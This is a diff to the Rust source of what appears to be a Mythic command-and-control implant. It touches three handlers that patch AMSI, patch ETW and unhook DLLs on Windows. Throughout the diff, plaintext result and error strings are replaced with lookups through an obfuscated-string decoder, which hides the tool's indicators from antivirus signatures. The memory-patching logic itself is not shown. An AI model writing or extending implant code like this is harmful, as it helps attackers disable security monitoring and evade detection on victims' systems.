@@ -37,15 +37,17 @@ pub fn amsi_patch(
     // Check the result
     let output = match shell_cmd.status.code() {
         Some(0) => {
-            format!("AMSI patched successfully in current process.\n\nStdout:\n{}",
+            format!("{}.\n\nStdout:\n{}",
+                crate::obfstr::d(crate::obfstr::S_AMSI_PATCHED),
                 std::str::from_utf8(&shell_cmd.stdout)?)
         }
         Some(code) => {
-            format!("AMSI patch failed with exit code: {}\n\nStderr:\n{}",
+            format!("{}: {}\n\nStderr:\n{}",
+                crate::obfstr::d(crate::obfstr::S_AMSI_FAIL),
                 code,
                 std::str::from_utf8(&shell_cmd.stderr)?)
         }
-        None => "AMSI patch command was killed by signal.".to_string(),
+        None => crate::obfstr::d(crate::obfstr::S_AMSI_KILLED),
     };
 
     // Send the result to Mythic
@@ -65,7 +67,7 @@ pub fn amsi_patch(
     rx: mpsc::Receiver<serde_json::Value>,
 ) -> Result<(), Box<dyn Error>> {
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    tx.send(mythic_error!(task.id, "amsi_patch is only supported on Windows".to_string()))?;
+    tx.send(mythic_error!(task.id, format!("amsi_patch {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))?;
     Ok(())
 }
 
@@ -93,15 +95,17 @@ pub fn etw_patch(
     // Check the result
     let output = match shell_cmd.status.code() {
         Some(0) => {
-            format!("ETW patched successfully in current process.\n\nStdout:\n{}",
+            format!("{}.\n\nStdout:\n{}",
+                crate::obfstr::d(crate::obfstr::S_ETW_PATCHED),
                 std::str::from_utf8(&shell_cmd.stdout)?)
         }
         Some(code) => {
-            format!("ETW patch failed with exit code: {}\n\nStderr:\n{}",
+            format!("{}: {}\n\nStderr:\n{}",
+                crate::obfstr::d(crate::obfstr::S_ETW_FAIL),
                 code,
                 std::str::from_utf8(&shell_cmd.stderr)?)
         }
-        None => "ETW patch command was killed by signal.".to_string(),
+        None => crate::obfstr::d(crate::obfstr::S_ETW_KILLED),
     };
 
     // Send the result to Mythic
@@ -121,7 +125,7 @@ pub fn etw_patch(
     rx: mpsc::Receiver<serde_json::Value>,
 ) -> Result<(), Box<dyn Error>> {
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    tx.send(mythic_error!(task.id, "etw_patch is only supported on Windows".to_string()))?;
+    tx.send(mythic_error!(task.id, format!("etw_patch {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))?;
     Ok(())
 }
 
@@ -155,17 +159,22 @@ pub fn unhook(
     // Check the result
     let output = match shell_cmd.status.code() {
         Some(0) => {
-            format!("Unhook operation for {} completed.\n\nStdout:\n{}\n\nNote: Full unhooking requires VirtualProtect and memory copy operations, which are planned for a future update.",
+            format!("{} {} {}.\n\nStdout:\n{}\n\n{}",
+                crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE),
                 dll_name,
-                std::str::from_utf8(&shell_cmd.stdout)?)
+                crate::obfstr::d(crate::obfstr::S_UNHOOK_COMPLETE),
+                std::str::from_utf8(&shell_cmd.stdout)?,
+                crate::obfstr::d(crate::obfstr::S_UNHOOK_NOTE))
         }
         Some(code) => {
-            format!("Unhook operation for {} failed with exit code: {}\n\nStderr:\n{}",
+            format!("{} {} {}: {}\n\nStderr:\n{}",
+                crate::obfstr::d(crate::obfstr::S_UNHOOK_DONE),
                 dll_name,
+                crate::obfstr::d(crate::obfstr::S_UNHOOK_FAIL),
                 code,
                 std::str::from_utf8(&shell_cmd.stderr)?)
         }
-        None => "Unhook command was killed by signal.".to_string(),
+        None => crate::obfstr::d(crate::obfstr::S_UNHOOK_KILLED),
     };
 
     // Send the result to Mythic
@@ -185,7 +194,7 @@ pub fn unhook(
     rx: mpsc::Receiver<serde_json::Value>,
 ) -> Result<(), Box<dyn Error>> {
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    tx.send(mythic_error!(task.id, "unhook is only supported on Windows".to_string()))?;
+    tx.send(mythic_error!(task.id, format!("unhook {}", crate::obfstr::d(crate::obfstr::S_WINDOWS_ONLY))))?;
     Ok(())
 }
 
